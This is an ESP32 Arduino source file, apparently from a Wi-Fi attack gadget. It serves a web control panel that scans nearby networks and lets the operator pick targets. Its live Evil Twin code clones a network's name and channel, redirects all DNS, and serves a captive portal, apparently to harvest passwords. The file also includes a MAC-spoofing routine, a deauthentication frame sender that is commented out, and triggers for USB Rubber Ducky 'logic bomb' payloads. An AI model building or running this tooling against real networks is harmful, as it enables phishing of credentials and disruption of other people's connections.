

#include <cstring>

#include <DNSServer.h>
#include <HTTP_Method.h>
#include <Uri.h>
#include <WebServer.h>

#include <WiFi.h>
#include <WiFiAP.h>
#include <WiFiClient.h>
#include <WiFiGeneric.h>
#include <WiFiMulti.h>
#include <WiFiSTA.h>
#include <WiFiScan.h>
#include <WiFiServer.h>
#include <WiFiType.h>
#include <WiFiUdp.h>

#include "esp_wifi.h"
// #include "bypass.h"
#include "usbRubberDucky.h"
#include "apHtmlPages.h"

#define MAX_NETWORKS 10

typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  WifiAp;

typedef struct {
  uint8_t frame_control[2] = { 0xC0, 0x00 };
  uint8_t duration[2];
  uint8_t station[6];
  uint8_t sender[6];
  uint8_t access_point[6];
  uint8_t fragment_sequence[2] = { 0xF0, 0xFF };
  uint16_t reason;
} deauth_frame_t;

WifiAp networks[MAX_NETWORKS];


const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
WebServer server(80);

//struct network beacon packet
void scanForNetworks(WifiAp * networks){

  int numberOfNetworks = WiFi.scanNetworks();

  if(numberOfNetworks>0){

    for(int i = 0; i<MAX_NETWORKS && i<numberOfNetworks; i++){

      WifiAp net;
      net.ssid = WiFi.SSID(i);
      for(int j = 0; j<6; j++){

        net.bssid[j] = WiFi.BSSID(i)[j];

      }

      net.ch = WiFi.channel(i);

      networks[i] = net;
    }

  }

}

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

void start_deauth(WifiAp wifi) {

  // deauth_frame_t deauthPacket;

  // deauthPacket.reason = 5;

  // Serial.println("Starting Deauth-Attack on network");
  // Serial.println(wifi.ssid);

  // WiFi.softAP(wifi.ssid, "", wifi.ch);
  // memcpy(deauthPacket.access_point, wifi.bssid, 6);
  // memcpy(deauthPacket.sender, wifi.bssid, 6);
  // esp_wifi_set_promiscuous(true);

  // while(true){

  //   esp_wifi_80211_tx(WIFI_IF_AP, &deauthPacket, sizeof(deauthPacket), false);

  // }

}

bool spoofMac(uint8_t mac[]){

  esp_wifi_stop();  // Ferma Wi-Fi prima di cambiare MAC
  esp_err_t result = esp_wifi_set_mac(WIFI_IF_AP, mac);
  esp_wifi_start(); // Riavvia il Wi-Fi

  return (result == ESP_OK) ? true : false;

}


void captivePortal(){

  server.send(200, "text/html", etCaptivePortalPage);

}

void indexPage(){

  server.send(200, "text/html", apIndexPage);

}

void selectURBPayload(){

  server.send(200, "text/html", selectLogicBomb);

}


void startURD(){

  char buffer[60];
  int index;

  if(server.hasArg("payload")){

    strncpy(buffer, server.arg("payload").c_str(), sizeof(buffer));
    
    index = atoi(buffer);

    startPayload("", "", "", index);

  }

}

void selectNetworkPageFn(){

  //pagina html
  String page = selectNetworkPage;
  //passa l'indirizzo dell'array e lo riempie con i dati dei networks circostanti
  scanForNetworks(networks);


  for(int i=0; i<MAX_NETWORKS; i++){

    char index[5];
    itoa(i, index, 10);

    page+= "<tr><td>"+networks[i].ssid+"</td>";
    page+= "<td><form action='/networkAttack' method='get'><input type='hidden' name='networkId' value='"+((String) index)+"'><input type='submit' name='ev' value='EvilTwin'></form></td>";
    page+= "<td><form action='/networkAttack' method='get'><input type='hidden' name='networkId' value='"+((String) index)+"'><input type='submit' name='da' value='Deauth'></form></td></tr>";

  }

  page+="</table></body></html>";

  //invio la risposta
  server.send(200, "text/html", page);

}



void networkAttack(){

  char buffer[60];
  int index;

  if(server.hasArg("networkId")){

    strncpy(buffer, server.arg("networkId").c_str(), sizeof(buffer));
    
    index = atoi(buffer);

    if(server.hasArg("ev")){

      // if(spoofMac(networks[index].bssid)){

      //   Serial.println("MAC Spoofing riuscito");

      // }
      // else{

      //   Serial.println("Errore durante lo spoofing del MAC");

      // }

      Serial.println("Starting Evil Twin on network");
      Serial.println(networks[index].ssid);

      WiFi.mode(WIFI_AP_STA);
      //                IP address                  gw IP address               subnetmask
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(networks[index].ssid, "", (int) networks[index].ch);

      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

      server.on("/", captivePortal);
      server.onNotFound(captivePortal);
      server.begin();

    }
    if(server.hasArg("da")){

      start_deauth(networks[index]);

    }

  }

}

void apInit(const char * apName, const char * apPasswd){

    WiFi.mode(WIFI_AP_STA);
    //                IP address                  gw IP address               subnetmask
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP(apName, apPasswd);
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    server.on("/", indexPage);
    server.on("/attackWF", selectNetworkPageFn);
    server.on("/attackBT", indexPage);
    server.on("/attackURB", selectURBPayload);
    server.on("/networkAttack", networkAttack);
    server.on("/startURD", startURD);
    server.onNotFound(indexPage);
    server.begin();

}

void apHandler(){

    dnsServer.processNextRequest();
    server.handleClient();

}